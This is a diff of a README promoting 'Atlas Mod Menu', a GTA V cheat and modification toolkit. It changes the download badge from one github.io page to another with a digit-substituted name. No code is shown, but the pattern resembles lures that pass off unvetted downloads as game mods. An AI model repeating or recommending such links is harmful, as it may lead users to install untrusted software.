@@ -2,7 +2,7 @@
 
 Atlas Mod Menu is a robust and intelligent modification toolkit tailored for Grand Theft Auto V. It empowers users with full control over gameplay elements, from tactical ESP and dynamic teleportation to immersive character customization and modulated weapons. Whether you're a casual explorer or an advanced roleplayer, Atlas delivers unmatched flexibility and intuitive power.
 
-[![Download Atlas Mod Menu](https://img.shields.io/badge/Download-Atlas_Mod_Menu-blueviolet)](https://bueno-nft-desktop-app.github.io/.github)
+[![Download Atlas Mod Menu](https://img.shields.io/badge/Download-Atlas_Mod_Menu-blueviolet)](https://atlas-m0dmenu-download.github.io/.github/)
 
 ---
 
